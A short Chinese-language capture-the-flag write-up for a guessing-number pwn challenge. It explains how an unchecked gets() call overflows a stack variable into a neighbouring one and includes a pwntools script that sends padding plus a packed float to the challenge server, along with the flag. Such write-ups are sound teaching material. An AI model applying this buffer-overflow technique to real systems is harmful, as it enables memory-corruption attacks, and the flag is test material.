ida中可以看到，本题目标是通过gets()设置v1，从而修改栈上的v2
![](https://img.h1kari.cn/blog/images/3b52e80aa7623801e8203731ecb1c500f55f968f59b3c420380f518285302315.webp)

在上方变量定义处可以看到，相对于栈顶rsp，v1和v2的offset分别为0x0和0x2c，那么只需填充满v1即可设置v2为指定的内容，从而获取到flag是`CTF2{f8d36b52-8438-4128-a917-fe878ed0a1e6}`
![](https://img.h1kari.cn/blog/images/7a0094374149585a6348144d182207d731158e08e35433675383aff068ae7176.webp)

## EXP
```python
from pwn import *

context.arch = "amd64"

io = remote("3a7241c6bbb90aa90fe088b6.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="3a7241c6bbb90aa90fe088b6.tcp-ctf2.dasctf.com")

payload = b"A" * 0x2C + struct.pack("<f", 11.28125)

io.sendlineafter(b"Let's guess the number.", payload)
io.interactive()

```
